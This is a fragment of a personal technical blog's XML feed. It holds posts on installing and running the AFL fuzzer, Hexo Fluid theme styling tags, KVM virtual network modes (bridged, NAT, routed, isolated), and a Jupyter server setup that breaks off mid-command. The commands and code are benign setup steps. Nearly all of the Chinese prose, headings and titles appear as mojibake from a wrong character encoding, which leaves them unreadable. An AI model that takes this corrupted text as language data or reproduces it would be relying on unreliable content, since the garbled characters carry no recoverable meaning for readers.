å®‰è£…"></a>5.1 æºç å®‰è£…</h3><p><strong>é‡‡ç”¨æºç å®‰è£…AFLï¼š</strong></p><pre><code class="hljs bash"><span class="hljs-comment"># ä»githubä¸‹è½½æœ€æ–°çš„release v2.57b</span>wget https://github.com/google/AFL/archive/v2.57b.tar.gz -O afl-2.57b.tar.gz<span class="hljs-comment"># å®˜ç½‘è‡ª2017å¹´11æœˆå°±æ²¡æœ‰å†æ›´æ–°ï¼Œlatest version ä¸º2.52b</span><span class="hljs-comment"># wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz -O afl-2.52b.tar.gz</span>tar xvzf afl-2.57b.tar.gz<span class="hljs-built_in">cd</span> afl-2.57b<span class="hljs-comment"># make &amp;&amp; make install</span><span class="hljs-built_in">sudo</span> make &amp;&amp; <span class="hljs-built_in">sudo</span> make install</code></pre><p> å®‰è£…å®Œæˆåï¼Œ<code>afl-*</code>ç­‰äºŒè¿›åˆ¶æ–‡ä»¶é»˜è®¤åœ¨<code>/usr/local/bin/</code>ç›®å½•ä¸‹ ï¼Œæ·»åŠ å…¶åˆ°ç¯å¢ƒå˜é‡<code>PATH</code>å³å¯</p><blockquote><p>å‡ºäºç ”ç©¶çš„è€ƒè™‘ï¼Œç¯å¢ƒä¸­å¾ˆå¯èƒ½ä¸æ­¢ä¸€ç§fuzzerï¼Œå› æ­¤ä¸å»ºè®®make installï¼Œç”¨ç»å¯¹è·¯å¾„ä½¿ç”¨å³å¯</p></blockquote><h3 id="5-2-æ’æ¡©ä¸Fuzzing"><a href="#5-2-æ’æ¡©ä¸Fuzzing" class="headerlink" title="5.2 æ’æ¡©ä¸Fuzzing"></a>5.2 æ’æ¡©ä¸Fuzzing</h3><ul><li>ä½¿ç”¨afl-gcc/afl-g++è¿›è¡Œæ’æ¡©ï¼š</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># è¿›å…¥å¾…æµ‹ç¨‹åºç›®å½•ï¼ŒæŒ‡å®šCC/CXXã€‚æ³¨æ„éœ€è¦æå‰åˆ›å»º/PATH/TO/BUILDå®‰è£…ç›®å½•</span><span class="hljs-built_in">cd</span> /PATH/TO/PROGRAMCC=/PATH/TO/afl-gcc CXX=/PATH/TO/afl-g++ ./configure --prefix=/PATH/TO/BUILDmake -j &amp;&amp; <span class="hljs-built_in">sudo</span> make install</code></pre><ul><li>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>llvm_mode</code>è¿›è¡Œæ’æ¡©ï¼š</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># ç¼–è¯‘afl-clang-fast</span><span class="hljs-built_in">cd</span> llvm_mode &amp;&amp; make<span class="hljs-comment"># æ’æ¡©</span><span class="hljs-built_in">cd</span> /PATH/TO/PROGRAMCC=/PATH/TO/afl-clang-fast CXX=/PATH/TO/afl-clang-fast++ ./configure --prefix=/PATH/TO/BUILDmake -j &amp;&amp; <span class="hljs-built_in">sudo</span> make install</code></pre><ul><li>åˆ›å»ºFuzzçš„å·¥ä½œç›®å½•ï¼Œå¼€å§‹Fuzz</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># æˆ‘ä¸ªäººæ¯”è¾ƒå–œæ¬¢çš„ç›®å½•ç»“æ„å¦‚ä¸‹</span>â”œâ”€fuzz-PROGRAM    â”œâ”€bin      <span class="hljs-comment"># ä½¿ç”¨bin/PROGRAMè€Œä¸æ˜¯PROGRAMå¯ä»¥é¿å…åœ¨PATHä¸­æœç´¢</span>    â”œâ”€<span class="hljs-keyword">in</span>       <span class="hljs-comment"># å­˜æ”¾åˆå§‹ç§å­</span>    â””â”€out      <span class="hljs-comment"># Fuzzçš„è¾“å‡º</span><span class="hljs-built_in">cd</span> fuzz-PROGRAM/PATH/TO/afl-fuzz -i <span class="hljs-keyword">in</span> -o out bin/PROGRAM [argvs] @@</code></pre><h3 id="5-3-ç»“æœåˆ†æ"><a href="#5-3-ç»“æœåˆ†æ" class="headerlink" title="5.3 ç»“æœåˆ†æ"></a>5.3 ç»“æœåˆ†æ</h3><p>TO BE COMPLETED</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AFL</tag>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fluidä¸»é¢˜æ ·å¼å¤‡å¿˜å½•</title>
    <link href="/2020/07/15/Fluid%E4%B8%BB%E9%A2%98%E6%A0%B7%E5%BC%8F%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2020/07/15/Fluid%E4%B8%BB%E9%A2%98%E6%A0%B7%E5%BC%8F%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hexo.fluid-dev.com/docs/">Hexo Fluid</a>æ˜¯ä¸€æ¬¾å…¼å…·ç¾è§‚å’Œå®ç”¨çš„åšå®¢ä¸»é¢˜ã€‚æœ¬æ–‡ç”¨äºè®°å½•å…¶å¸¸ç”¨æ ·å¼çš„ç”¨æ³•ï¼ŒåŒ…æ‹¬è„šæ³¨ï¼Œ</p><span id="more"></span><h2 id="1-è„šæ³¨"><a href="#1-è„šæ³¨" class="headerlink" title="1 è„šæ³¨"></a>1 è„šæ³¨</h2><p>ä¸»é¢˜å†…ç½®äº†è„šæ³¨è¯­æ³•æ”¯æŒï¼Œå¯ä»¥åœ¨æ–‡ç« æœ«å°¾è‡ªåŠ¨ç”Ÿæˆå¸¦æœ‰é”šç‚¹çš„è„šæ³¨ï¼Œè¯¥åŠŸèƒ½åœ¨<strong>ä¸»é¢˜é…ç½®</strong>ä¸­é»˜è®¤å¼€å¯ï¼š</p><pre><code class="hljs yaml"><span class="hljs-attr">post:</span>  <span class="hljs-attr">footnote:</span>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span>    <span class="hljs-attr">header:</span> <span class="hljs-string">&#x27;&#x27;</span></code></pre><p>å‚è€ƒé…ç½®æŒ‡å—<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="Fluidé…ç½®æŒ‡å—">[1]</span></a></sup>ï¼Œå¯çŸ¥è„šæ³¨è¯­æ³•å¦‚ä¸‹ï¼š</p><pre><code class="hljs markdown">è¿™æ˜¯ä¸€å¥è¯<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="Fluidé…ç½®æŒ‡å—">[1]</span></a></sup>[<span class="hljs-symbol">^1</span>]: <span class="hljs-link">è¿™æ˜¯å¯¹åº”çš„è„šæ³¨</span></code></pre><p>æ›´ä¼˜é›…çš„ä½¿ç”¨æ–¹å¼ï¼Œæ˜¯å°†è„šæ³¨å†™åœ¨æ–‡æœ«ï¼Œæ¯”å¦‚ï¼š</p><pre><code class="hljs markdown">æ­£æ–‡<span class="hljs-section">## å‚è€ƒ</span>[<span class="hljs-symbol">^1</span>]: <span class="hljs-link">å‚è€ƒèµ„æ–™1</span>[<span class="hljs-symbol">^2</span>]: <span class="hljs-link">å‚è€ƒèµ„æ–™2</span></code></pre><h2 id="2-Tagæ’ä»¶"><a href="#2-Tagæ’ä»¶" class="headerlink" title="2 Tagæ’ä»¶"></a>2 Tagæ’ä»¶</h2><h3 id="2-1-ä¾¿ç­¾"><a href="#2-1-ä¾¿ç­¾" class="headerlink" title="2.1 ä¾¿ç­¾"></a>2.1 ä¾¿ç­¾</h3><p>åœ¨ markdown ä¸­åŠ å…¥å¦‚ä¸‹çš„ä»£ç æ¥ä½¿ç”¨ä¾¿ç­¾ï¼š</p><pre><code class="hljs markdown">&#123;% note success %&#125;æ–‡å­— æˆ–è€… <span class="hljs-code">`markdown`</span> å‡å¯&#123;% endnote %&#125;</code></pre><p>æˆ–è€…ä½¿ç”¨ HTML å½¢å¼ï¼š</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;note note-primary&quot;</span>&gt;</span>æ ‡ç­¾<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p><p class="note note-primary">å¯é€‰ä¾¿ç­¾ï¼šsuccess, danger, warning, primary, secondary, info, light</p></p><p><p class="note note-success">success</p></p><p><p class="note note-danger">danger</p></p><p><p class="note note-warning">warning</p></p><p><p class="note note-primary">primary</p></p><p><p class="note note-secondary">secondary</p></p><p><p class="note note-info">info</p></p><p><p class="note note-light">light</p></p><h3 id="2-2-è¡Œå†…æ ‡ç­¾"><a href="#2-2-è¡Œå†…æ ‡ç­¾" class="headerlink" title="2.2 è¡Œå†…æ ‡ç­¾"></a>2.2 è¡Œå†…æ ‡ç­¾</h3><p>åœ¨ markdown ä¸­åŠ å…¥å¦‚ä¸‹çš„ä»£ç æ¥ä½¿ç”¨ Labelï¼š</p><pre><code class="hljs markdown">&#123;% label primary @text %&#125;</code></pre><p>æˆ–è€…ä½¿ç”¨ HTML å½¢å¼ï¼š</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-primary&quot;</span>&gt;</span>Label<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></code></pre><p>å¯é€‰ Labelï¼š</p><p><span class="label label-primary">primary</span> <span class="label label-default">default</span> <span class="label label-info">info</span> <span class="label label-success">success</span> <span class="label label-warning">warning</span> <span class="label label-danger">danger</span> </p><h3 id="2-3-å‹¾é€‰æ¡†"><a href="#2-3-å‹¾é€‰æ¡†" class="headerlink" title="2.3 å‹¾é€‰æ¡†"></a>2.3 å‹¾é€‰æ¡†</h3><p>åœ¨ markdown ä¸­åŠ å…¥å¦‚ä¸‹çš„ä»£ç æ¥ä½¿ç”¨ Checkboxï¼š</p><pre><code class="hljs markdown">&#123;% cb text, checked?, incline? %&#125;</code></pre><p>textï¼šæ˜¾ç¤ºçš„æ–‡å­—<br>checkedï¼šé»˜è®¤æ˜¯å¦å·²å‹¾é€‰ï¼Œé»˜è®¤ false<br>incline: æ˜¯å¦å†…è”ï¼ˆå¯ä»¥ç†è§£ä¸ºåé¢çš„æ–‡å­—æ˜¯å¦æ¢è¡Œï¼‰ï¼Œé»˜è®¤ false</p><h3 id="2-4-æŒ‰é’®"><a href="#2-4-æŒ‰é’®" class="headerlink" title="2.4 æŒ‰é’®"></a>2.4 æŒ‰é’®</h3><p>ä½ å¯ä»¥åœ¨ markdown ä¸­åŠ å…¥å¦‚ä¸‹çš„ä»£ç æ¥ä½¿ç”¨ Buttonï¼š</p><pre><code class="hljs markdown">&#123;% btn url, text, title %&#125;</code></pre><p>æˆ–è€…ä½¿ç”¨ HTML å½¢å¼ï¼š</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>text<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>urlï¼šè·³è½¬é“¾æ¥<br>textï¼šæ˜¾ç¤ºçš„æ–‡å­—<br>titleï¼šé¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºçš„æ–‡å­—ï¼ˆå¯é€‰ï¼‰</p><a class="btn" href="https://hexo.fluid-dev.com/docs/guide/#tag-æ’ä»¶"  title="zzy yyds ï¼ˆï¿£ï¸¶ï¿£ï¼‰â†—" target="_blank">tag-æ’ä»¶ç”¨æ³•</a><h3 id="2-5-ç»„å›¾"><a href="#2-5-ç»„å›¾" class="headerlink" title="2.5 ç»„å›¾"></a>2.5 ç»„å›¾</h3><p>å¦‚æœæƒ³æŠŠå¤šå¼ å›¾ç‰‡æŒ‰ä¸€å®šå¸ƒå±€ç»„åˆæ˜¾ç¤ºï¼Œä½ å¯ä»¥åœ¨ markdown ä¸­æŒ‰å¦‚ä¸‹æ ¼å¼ï¼š</p><p>totalï¼šå›¾ç‰‡æ€»æ•°é‡ï¼Œå¯¹åº”ä¸­é—´åŒ…å«çš„å›¾ç‰‡ url æ•°é‡<br>n1-n2-â€¦ï¼šæ¯è¡Œçš„å›¾ç‰‡æ•°é‡ï¼Œå¯ä»¥çœç•¥ï¼Œé»˜è®¤å•è¡Œæœ€å¤š 3 å¼ å›¾ï¼Œæ±‚å’Œå¿…é¡»ç›¸ç­‰äº totalï¼Œå¦åˆ™æŒ‰é»˜è®¤æ ·å¼</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://hexo.fluid-dev.com/docs/guide/#è„šæ³¨">Fluidé…ç½®æŒ‡å—</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blog</tag>
      
      <tag>Theme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KVMè™šæ‹Ÿæœºçš„å››ç§ç½‘ç»œæ¨¡å¼</title>
    <link href="/2020/06/24/KVM%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F/"/>
    <url>/2020/06/24/KVM%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>å› ä¸ºå‰æ®µæ—¶é—´é¡¹ç›®éœ€è¦åœ¨KVMæ¶æ„çš„ç½‘ç»œé¶åœºä¸­è¿›è¡Œæ¼”ç¤ºï¼Œäºæ˜¯å­¦ä¹ å¹¶æ•´ç†äº†KVMè™šæ‹Ÿæœºæœ‰å…³ç½‘ç»œæ¶æ„çš„çŸ¥è¯†ã€‚</p><span id="more"></span><h2 id="1-KVMç®€ä»‹"><a href="#1-KVMç®€ä»‹" class="headerlink" title="1 KVMç®€ä»‹"></a>1 KVMç®€ä»‹</h2><p> Libvirtè™šæ‹Ÿç½‘ç»œä½¿ç”¨è™šæ‹Ÿç½‘ç»œäº¤æ¢æœºçš„æ¦‚å¿µã€‚è™šæ‹Ÿç½‘ç»œäº¤æ¢æœºæ˜¯åœ¨ä¸»æœºç‰©ç†æœºå™¨æœåŠ¡å™¨ä¸Šè¿è¡Œçš„è½¯ä»¶ç»“æ„ï¼Œè™šæ‹Ÿæœºï¼ˆå®¢æˆ·æœºï¼‰é€šè¿‡å®ƒè¿æ¥åˆ°è¯¥ç‰©ç†ä¸»æœºæœåŠ¡å™¨ã€‚å®¢æˆ·æœºçš„ç½‘ç»œæµé‡é€šè¿‡è¿™ä¸ªäº¤æ¢æœºè¢«å¼•å¯¼ï¼š </p><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210121220618.png"/></p><p> Linuxä¸»æœºç‰©ç†æœºæœåŠ¡å™¨å°†è™šæ‹Ÿç½‘ç»œäº¤æ¢æœºè¡¨ç¤ºä¸ºç½‘ç»œæ¥å£ã€‚å½“libvirtçš„å®ˆæŠ¤è¿›ç¨‹ï¼ˆlibvirtdï¼‰é¦–æ¬¡å®‰è£…å¹¶å¯åŠ¨æ—¶ï¼Œè¡¨ç¤ºè™šæ‹Ÿç½‘ç»œäº¤æ¢æœºçš„é»˜è®¤ç½‘ç»œæ¥å£æ˜¯virbr0ã€‚ </p><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210121220706.png"/></p><p> å¯ä»¥é€šè¿‡<code>ip</code>æˆ–è€…<code>ifconfig</code>æŸ¥çœ‹åˆ°æ­¤Interfaceï¼š </p><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126202816.png"/></p><h2 id="2-ç½‘ç»œæ¨¡å¼"><a href="#2-ç½‘ç»œæ¨¡å¼" class="headerlink" title="2 ç½‘ç»œæ¨¡å¼"></a>2 ç½‘ç»œæ¨¡å¼</h2><h3 id="2-1-æ¡¥æ¥æ¨¡å¼"><a href="#2-1-æ¡¥æ¥æ¨¡å¼" class="headerlink" title="2.1 æ¡¥æ¥æ¨¡å¼"></a>2.1 æ¡¥æ¥æ¨¡å¼</h3><p>åœ¨ä½¿ç”¨æ¡¥æ¥æ¨¡å¼æ—¶ï¼Œæ‰€æœ‰è™šæ‹Ÿæœºéƒ½å¥½åƒä¸ä¸»æœºç‰©ç†æœºå™¨åœ¨åŒä¸€ä¸ªå­ç½‘å†…ã€‚åŒä¸€ç‰©ç†ç½‘ç»œä¸­çš„æ‰€æœ‰å…¶ä»–ç‰©ç†æœºå™¨éƒ½çŸ¥é“è¿™äº›è™šæ‹Ÿæœºï¼Œå¹¶å¯ä»¥è®¿é—®è¿™äº›è™šæ‹Ÿæœºã€‚æ¡¥æ¥æ“ä½œåœ¨OSIç½‘ç»œæ¨¡å‹çš„ç¬¬2å±‚ã€‚</p><p>åœ¨ä¸­é—´ä»¶ï¼ˆhypervisor ï¼‰ä¸­å¯ä»¥ä½¿ç”¨å¤šä¸ªç‰©ç†æ¥å£ï¼Œé€šè¿‡ç»‘å®šæŠŠä»–ä»¬è¿æ¥åœ¨ä¸€èµ·ï¼Œç„¶åæŠŠå®ƒæ·»åŠ çš„ç½‘æ¡¥ï¼ŒåŒæ—¶è™šæ‹Ÿæœºä¹Ÿè¢«æ·»åŠ åˆ°è¿™ä¸ªç½‘æ¡¥ï¼Œç»‘å®šæ“ä½œæœ‰å¤šç§æ¨¡å¼ï¼Œåªæœ‰å°‘æ•°è¿™äº›æ¨¡å¼å¯ä»¥ä¸è™šæ‹Ÿå®¢æˆ·æœºæ­£åœ¨ä½¿ç”¨çš„æ¡¥æ¥å™¨é…åˆä½¿ç”¨ã€‚ </p><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126203108.png"/></p><h3 id="2-2-NATæ¨¡å¼"><a href="#2-2-NATæ¨¡å¼" class="headerlink" title="2.2 NATæ¨¡å¼"></a>2.2 NATæ¨¡å¼</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œè™šæ‹Ÿç½‘ç»œäº¤æ¢æœºä»¥NATæ¨¡å¼è¿è¡Œã€‚ä»–ä»¬ä½¿ç”¨IPä¼ªè£…è€Œä¸æ˜¯SNATï¼ˆSource-NATï¼‰æˆ–DNATï¼ˆDestination-NATï¼‰ã€‚IPä¼ªè£…ä½¿å¾—è¿æ¥çš„guestè™šæ‹Ÿæœºå¯ä»¥ä½¿ç”¨ä¸»æœºç‰©ç†æœºå™¨IPåœ°å€ä¸ä»»ä½•å¤–éƒ¨ç½‘ç»œè¿›è¡Œé€šä¿¡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè™šæ‹Ÿç½‘ç»œäº¤æ¢æœºåœ¨NATæ¨¡å¼ä¸‹è¿è¡Œæ—¶ï¼Œæ”¾ç½®åœ¨ä¸»æœºç‰©ç†æœºå¤–éƒ¨çš„è®¡ç®—æœºæ— æ³•ä¸å…¶ä¸­çš„guestè™šæ‹Ÿæœºè¿›è¡Œé€šä¿¡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š </p><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126203149.png"/></p><p>DNSå’ŒDHCP<br>IPåœ°å€å¯ä»¥é€šè¿‡DHCPåˆ†é…ç»™å®¢æˆ·æœºã€‚ä¸ºæ­¤ï¼Œå¯ä»¥å°†åœ°å€æ± åˆ†é…ç»™è™šæ‹Ÿç½‘ç»œäº¤æ¢æœºã€‚Libvirtä½¿ç”¨è¿™ä¸ªdnsmasqç¨‹åºã€‚dnsmasqçš„ä¸€ä¸ªå®ä¾‹æ˜¯ç”±libvirtä¸ºæ¯ä¸ªéœ€è¦å®ƒçš„è™šæ‹Ÿç½‘ç»œäº¤æ¢æœºè‡ªåŠ¨é…ç½®å’Œå¯åŠ¨çš„ã€‚ </p><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126204251.png"/></p><h3 id="2-3-è·¯ç”±æ¨¡å¼"><a href="#2-3-è·¯ç”±æ¨¡å¼" class="headerlink" title="2.3 è·¯ç”±æ¨¡å¼"></a>2.3 è·¯ç”±æ¨¡å¼</h3><p>å½“ä½¿ç”¨è·¯ç”±æ¨¡å¼æ—¶ï¼Œè™šæ‹Ÿäº¤æ¢æœºè¿æ¥åˆ°è¿æ¥åˆ°ä¸»æœºç‰©ç†æœºå™¨çš„ç‰©ç†LANï¼Œåœ¨ä¸ä½¿ç”¨NATçš„æƒ…å†µä¸‹æ¥å›ä¼ è¾“æµé‡ã€‚è™šæ‹Ÿäº¤æ¢æœºå¯ä»¥æ£€æŸ¥æ‰€æœ‰æµé‡ï¼Œå¹¶ä½¿ç”¨ç½‘ç»œæ•°æ®åŒ…ä¸­åŒ…å«çš„ä¿¡æ¯æ¥åšå‡ºè·¯ç”±å†³ç­–ã€‚ä½¿ç”¨æ­¤æ¨¡å¼æ—¶ï¼Œæ‰€æœ‰è™šæ‹Ÿæœºéƒ½ä½äºå…¶è‡ªå·±çš„å­ç½‘ä¸­ï¼Œé€šè¿‡è™šæ‹Ÿäº¤æ¢æœºè¿›è¡Œè·¯ç”±ã€‚è¿™ç§æƒ…å†µå¹¶ä¸æ€»æ˜¯ç†æƒ³çš„ï¼Œå› ä¸ºç‰©ç†ç½‘ç»œä¸Šçš„å…¶ä»–ä¸»æœºç‰©ç†æœºå™¨ä¸é€šè¿‡æ‰‹å·¥é…ç½®çš„è·¯ç”±ä¿¡æ¯æ˜¯æ²¡æ³•å‘ç°è¿™äº›è™šæ‹Ÿæœºï¼Œå¹¶ä¸”ä¸èƒ½è®¿é—®è™šæ‹Ÿæœºã€‚è·¯ç”±æ¨¡å¼åœ¨OSIç½‘ç»œæ¨¡å‹çš„ç¬¬ä¸‰å±‚è¿è¡Œã€‚ </p><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126204315.png"/></p><h3 id="2-4-éš”ç¦»æ¨¡å¼"><a href="#2-4-éš”ç¦»æ¨¡å¼" class="headerlink" title="2.4 éš”ç¦»æ¨¡å¼"></a>2.4 éš”ç¦»æ¨¡å¼</h3><p>ä½¿ç”¨éš”ç¦»æ¨¡å¼æ—¶ï¼Œè¿æ¥åˆ°è™šæ‹Ÿäº¤æ¢æœºçš„è™šæ‹Ÿæœºå¯ä»¥ç›¸äº’é€šä¿¡ï¼Œä¹Ÿå¯ä»¥ä¸ä¸»æœºç‰©ç†æœºé€šä¿¡ï¼Œä½†å…¶é€šä¿¡ä¸ä¼šä¼ åˆ°ä¸»æœºç‰©ç†æœºå¤–ï¼Œä¹Ÿä¸èƒ½ä»ä¸»æœºç‰©ç†æœºå¤–éƒ¨æ¥æ”¶é€šä¿¡ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ä½¿ç”¨dnsmasqå¯¹äºè¯¸å¦‚DHCPçš„åŸºæœ¬åŠŸèƒ½æ˜¯å¿…éœ€çš„ã€‚ä½†æ˜¯ï¼Œå³ä½¿è¯¥ç½‘ç»œä¸ä»»ä½•ç‰©ç†ç½‘ç»œéš”ç¦»ï¼ŒDNSåç§°ä»ç„¶è¢«è§£æçš„ã€‚å› æ­¤ï¼ŒDNSåç§°èƒ½è§£æä½†ICMPå›åº”è¯·æ±‚ï¼ˆpingï¼‰å‘½ä»¤å¤±è´¥è¿™ç§æƒ…å†µå¯èƒ½ä¼šå‡ºç°ã€‚ </p><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126204331.png"/></p><h3 id="2-5-é»˜è®¤æ¨¡å¼"><a href="#2-5-é»˜è®¤æ¨¡å¼" class="headerlink" title="2.5 é»˜è®¤æ¨¡å¼"></a>2.5 é»˜è®¤æ¨¡å¼</h3><p>libvirtdç¬¬ä¸€æ¬¡è¢«å®‰è£…æ—¶ï¼Œå®ƒå°†åŒ…å«é…ç½®åœ¨NATæ¨¡å¼ä¸‹çš„åˆå§‹è™šæ‹Ÿç½‘ç»œäº¤æ¢æœºã€‚ä½¿ç”¨æ­¤é…ç½®ï¼Œä»¥ä¾¿å®‰è£…çš„guestè™šæ‹Ÿæœºå¯ä»¥é€šè¿‡ä¸»æœºç‰©ç†æœºä¸å¤–éƒ¨ç½‘ç»œè¿›è¡Œé€šä¿¡ã€‚ä¸‹å›¾æ˜¾ç¤ºäº†è¿™ä¸ªé»˜è®¤é…ç½®libvirtdï¼š </p><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210126204455.png"/></p><h2 id="3-å‚è€ƒ"><a href="#3-å‚è€ƒ" class="headerlink" title="3 å‚è€ƒ"></a>3 å‚è€ƒ</h2> <div class="note note-danger">            <p>æœ¬ç¯‡åšæ–‡æœ‰å¾…å®Œå–„ï¼Œè¿˜éœ€æ·»åŠ è‡ªå·±çš„å®éªŒéƒ¨åˆ†orz</p>          </div> <p><a href="https://blog.csdn.net/gsl371/article/details/78662258?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160750263919725271090221%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=160750263919725271090221&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-78662258.nonecase&amp;utm_term=kvm%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C&amp;spm=1018.2118.3001.4449">[1] kvmè™šæ‹Ÿæœºçš„å››ç§ç½‘ç»œæ¨¡å¼</a></p><p><a href="https://blog.csdn.net/ccschan/article/details/88095718?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-13.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-13.control">[2] KVMè™šæ‹ŸåŒ–ä¹‹å››ç§ç½‘ç»œæ¨¡å‹</a></p>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Virtualization</tag>
      
      <tag>KVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ­å»ºJupyter-NotebookæœåŠ¡å™¨</title>
    <link href="/2020/06/02/%E6%90%AD%E5%BB%BAJupyter-Notebook%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2020/06/02/%E6%90%AD%E5%BB%BAJupyter-Notebook%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>åœ¨è‡ªå·±çš„äº‘æœåŠ¡å™¨ä¸Šæ­å»ºJupyter-NotebookæœåŠ¡å™¨æœ‰ä»¥ä¸‹å‡ ä¸ªå¥½å¤„ï¼š</p><span id="more"></span><ul><li>å……åˆ†åˆ©ç”¨äº‘æœåŠ¡å™¨çš„è®¡ç®—å’Œå­˜å‚¨èµ„æº</li><li>ç»Ÿä¸€ä»£ç ç¯å¢ƒå’Œæ•°æ®é›†ï¼ˆåœ¨ä¸åŒç»ˆç«¯æœºå™¨ä¸Šæ„å»ºçš„ç¯å¢ƒæ˜¯å¯èƒ½ä¸ä¸€è‡´çš„ï¼‰</li><li>èƒ½å¤Ÿéšæ—¶éšåœ°è®¿é—®ï¼ˆåªè¦ECSè¿˜æ²¡è¿‡æœŸ&amp;ä½ çš„æœºå™¨èƒ½ä¸Šç½‘ï¼‰</li></ul><h2 id="1-ç¯å¢ƒæ­å»º"><a href="#1-ç¯å¢ƒæ­å»º" class="headerlink" title="1 ç¯å¢ƒæ­å»º"></a>1 ç¯å¢ƒæ­å»º</h2><h3 id="1-1-å®‰è£…Python"><a href="#1-1-å®‰è£…Python" class="headerlink" title="1.1 å®‰è£…Python"></a>1.1 å®‰è£…Python</h3><p>è™½ç„¶é˜¿é‡Œäº‘çš„Ubuntu 18.04 äº‘æœåŠ¡å™¨æ˜¯è‡ªå¸¦python2.7å’Œpython3.6çš„ï¼Œä½†æˆ‘è¿˜æ˜¯é€‰æ‹©<strong>å®‰è£…miniconda3<a href="https://docs.conda.io/en/latest/miniconda.html">(å®˜ç½‘)</a></strong>ï¼Œç†ç”±å¦‚ä¸‹ï¼š</p><ul><li>anacondaä¾¿äºç®¡ç†<strong>å¤šç‰ˆæœ¬ä¸”éš”ç¦»</strong>çš„pythonç¯å¢ƒï¼ˆé™¤æ­¤ä»¥å¤–virtualenvå’Œpyvenvä¹Ÿå¯ï¼Œä½†ç®¡ç†æ–¹å¼ä¸å¦‚condaï¼‰</li><li>minicondaæ¯”anaconda<strong>è½»é‡</strong>ï¼Œå®ƒä»…åŒ…å«<strong>condaå’Œpython</strong>å’Œå°‘é‡ä¾èµ–åŒ…ä¸è½¯ä»¶åŒ…</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># ä»å®˜æ–¹ç«™ç‚¹ä¸‹è½½é€Ÿåº¦è¾ƒæ…¢ï¼Œå¯ä»å›½å†…é•œåƒç«™ä¸‹è½½miniconda3-py38 64-bit</span>wget -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-py38_4.9.2-Linux-x86_64.sh<span class="hljs-comment"># æ·»åŠ å½“å‰ç”¨æˆ·å¯æ‰§è¡Œæƒé™</span><span class="hljs-built_in">chmod</span> u+x ./Miniconda3-py38_4.9.2-Linux-x86_64.sh<span class="hljs-comment"># æ‰§è¡Œå®‰è£…è„šæœ¬ï¼Œä¾ç…§æç¤ºå®Œæˆå®‰è£…</span>./Miniconda3-py38_4.9.2-Linux-x86_64.sh<span 